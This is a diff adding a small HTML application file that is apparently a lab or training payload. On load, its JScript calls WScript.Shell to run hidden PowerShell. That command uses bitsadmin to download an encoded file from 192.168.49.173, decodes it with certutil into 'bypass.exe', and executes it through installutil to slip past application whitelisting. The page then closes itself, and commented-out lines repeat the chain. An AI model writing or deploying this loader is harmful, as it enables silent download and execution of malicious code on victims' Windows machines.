@@ -1,0 +1,16 @@
+<html>
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var re = shell.Run("powershell -windowstyle hidden bitsadmin /Transfer newjob3 http://192.168.49.173/enc3.txt c:\\windows\\temp\\enc3.txt;certutil -decode c:\\windows\\temp\\enc3.txt c:\\windows\\temp\\bypass.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\bypass.exe")
+//var res = shell.Run("bitsadmin /Transfer newjob2 http://192.168.49.173/enc2.txt c:\\windows\\temp\\enc1.txt");
+//var res1 = shell.Run("timeout 10 && certutil -decode c:\\windows\\temp\\enc.txt c:\\windows\\temp\\bypass.exe");
+//var res2 = shell.Run("timeout 12 && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\windows\\temp\\bypass.exe");
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
